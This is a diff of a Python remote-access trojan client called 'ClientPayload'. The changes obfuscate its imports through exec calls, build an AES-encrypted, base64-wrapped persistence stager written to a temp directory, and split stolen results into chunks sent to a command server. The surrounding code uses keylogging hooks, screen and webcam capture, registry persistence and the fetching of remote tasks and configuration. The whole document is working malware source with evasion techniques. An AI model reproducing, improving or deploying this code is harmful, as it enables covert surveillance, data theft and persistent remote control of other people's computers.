@@ -47,8 +47,21 @@
                             https://github.com/colental/ae
 """
 
-from __future__ import print_function
-import os
+
+
+def config(*arg, **options):
+    def decorator(function):
+        @functools.wraps(function)
+        def wrapper(*args, **kwargs):
+            return function(*args, **kwargs)
+        for k,v in options.items():
+            setattr(wrapper, k, v)
+        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
+        return wrapper
+    return decorator
+
+
+for pkg in '''import os
 import sys
 import imp
 import mss
@@ -78,50 +91,43 @@ from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256, HMAC
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.number import long_to_bytes, bytes_to_long
-from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
+from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey'''.splitlines():
+    exec pkg in globals()
+
 if os.name is 'nt':
-    from pyHook import HookManager
-    from pythoncom import PumpMessages, CoInitialize
-    from win32com.client import Dispatch
-    from win32com.shell.shell import ShellExecuteEx
-    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
+    for p in '''from wmi import WMI
+from pyHook import HookManager
+from pythoncom import PumpMessages, CoInitialize
+from win32com.client import Dispatch
+from win32com.shell.shell import ShellExecuteEx
+from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE'''.splitlines():
+        exec p in globals()
+
 else:
-    from pyxhook import HookManager
-
-
-
-def config(*arg, **options):
-    def decorator(function):
-        @functools.wraps(function)
-        def wrapper(*args, **kwargs):
-            return function(*args, **kwargs)
-        for k,v in options.items():
-            setattr(wrapper, k, v)
-        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
-        return wrapper
-    return decorator
-
+    try:
+        exec "from pyxhook import HookManager" in globals()
+    except: pass
 
 
 
 class ClientPayload(object):
 
-    __name__    = 'ClientPayload'
-    _abort      = 0
-    _debug      = 0
-    _config     = {}
-    _tasks      = Queue.Queue()
-    _lock       = threading.Lock()
+    __name__ = 'ClientPayload'
+    _abort   = 0
+    _debug   = 0
+    _config  = {}
+    _tasks   = Queue.Queue()
+    _lock    = threading.Lock()
     
 
     def __init__(self, *args, **kwargs):
-        self._workers   = OrderedDict()
-        self._results   = OrderedDict()
-        self._network   = OrderedDict()
-        self._session   = OrderedDict()
-        self._sysinfo   = self._get_sysinfo()
-        self._command   = self._get_command()
-        self._startup   = self._get_startup()
+        self._workers = OrderedDict()
+        self._results = OrderedDict()
+        self._network = OrderedDict()
+        self._session = OrderedDict()
+        self._sysinfo = self._get_sysinfo()
+        self._command = self._get_command()
+        self._startup = self._get_startup()
 
 
     @staticmethod
@@ -324,7 +330,7 @@ class ClientPayload(object):
             return fileh
         except Exception as e:
             ClientPayload.debug("{} error: {}".format(ClientPayload._get_png_from_data.func_name, str(e)))
-            
+
 
     @staticmethod
     def _get_server_addr():
@@ -927,19 +933,19 @@ class ClientPayload(object):
                 aesvar      = self._get_random_var(6)
                 key         = self._get_random_var(32)
                 iv          = self._get_random_var(16)
-                config      = ClientPayload._config['resources']['stager'].get('keys')
                 data        = ClientPayload._config['resources']['stager'].get('code')
-                main        = "\n\nif __name__ == '__main__':\n\tif len(sys.argv) > 1:\n\t\tif '--debug' in sys.argv:\n\t\t\t_debug = True\n\t\telse:\n\t\t\t_debug = False\n\t\tmain(config=%d)" % int(config)
+                config      = ClientPayload._config['resources']['stager'].get('config')
                 output_file = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', "{}.py".format(name))
-                imports     = ["from __future__ import print_function", "from base64 import b64decode as %s" % b64var, "from Crypto.Cipher import AES as %s" % aesvar] 
+                main        = "\n\nif __name__ == '__main__':\n\tif '--debug' in sys.argv:\n\t\t_debug = True\n\telse:\n\t\t_debug = False\n\tmain(config={})".format(int(config.get('r')))
+                imports     = ["from __future__ import print_function", "from base64 import b64decode as %s" % b64var, "from Crypto.Cipher import AES as %s" % aesvar]
                 _           = [(imports.append(line.strip()) if "import" in line and "__future__" not in line else output.append(line)) for line in data.splitlines()]
                 cipher      = AES.new(key, AES.MODE_CBC, iv)
-                ciphertext  = base64.b64encode(cipher.encrypt(self._get_padded('\n'.join(output), AES.block_size, '{')))
+                ciphertext  = base64.b64encode(iv + cipher.encrypt(self._get_padded('\n'.join(output), AES.block_size, '{')))
                 with file(output_file, 'w') as fp:
                     fp.write(";".join(imports) + "\nexec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\", 2).decrypt(%s(\"%s\")).rstrip(\"{\"))" % (aesvar, key, b64var, ciphertext))))
                 return (True, output_file)
             else:
-                return (False, "Error: missing resources required for encrypted stager")
+                 return (False, "Error: missing resources required for encrypted stager")
         except Exception as e:
             return (False, '{} error: {}'.format(self._persistence_add_encrypted_stager.func_name, str(e)))
         
@@ -1362,7 +1368,7 @@ class ClientPayload(object):
         try:
             if not len(self.process.buffer.getvalue()):
                 self.process.buffer.write("Time, User , Executable, PID, Privileges")
-            c = wmi.WMI()
+            c = WMI()
             process_watcher = c.Win32_Process.watch_for("creation")
             while True:
                 try:
@@ -1422,9 +1428,14 @@ class ClientPayload(object):
     def _server_send(self, **kwargs):
         if self._session['connection'].wait(timeout=1.0):
             try:
-                task = json.dumps(kwargs)
-                data = self._encrypt_data(task)
-                self._session['socket'].send(data + '\n')
+                buf = kwargs.get('result')
+                txt = buf[:48000]
+                nxt = buf[48000:]
+                kwargs.update({'result': txt})
+                self._session['socket'].send(self._encrypt_data(json.dumps(kwargs)) + '\n')
+                if nxt:
+                    kwargs.update({'result': nxt})
+                    self._server_send(**kwargs)
             except Exception as e:
                 self.debug('{} error: {}'.format(self._server_send.func_name, str(e)))
         
@@ -1433,7 +1444,7 @@ class ClientPayload(object):
         data = ''
         while '\n' not in data:
             try:
-                data += self._session['socket'].recv(65556)
+                data += self._session['socket'].recv(65536)
             except socket.timeout:
                 break
         if data and len(bytes(data)):
@@ -2502,7 +2513,9 @@ def main(*args, **kwargs):
         ClientPayload._config['resources']['stager'] = {'code': code}
         if 'r' in kwargs:
             r = kwargs.get('r')
-            ClientPayload._config['resources']['stager'].update({'config': r})
+            config = ClientPayload._get_remote_resource(r)
+            config = json.loads(config)
+            ClientPayload._config['resources']['stager'].update({'config': config})
     if 'g' in kwargs:
         g = kwargs.get('g')
         bash = ClientPayload._get_remote_resource(g)
@@ -2512,7 +2525,7 @@ def main(*args, **kwargs):
         tasks = ClientPayload._get_remote_resource(v).splitlines()
         ClientPayload._config['tasks'] = tasks
     payload = ClientPayload()
-    payload.run()
+    #payload.run()
     return payload
 
 
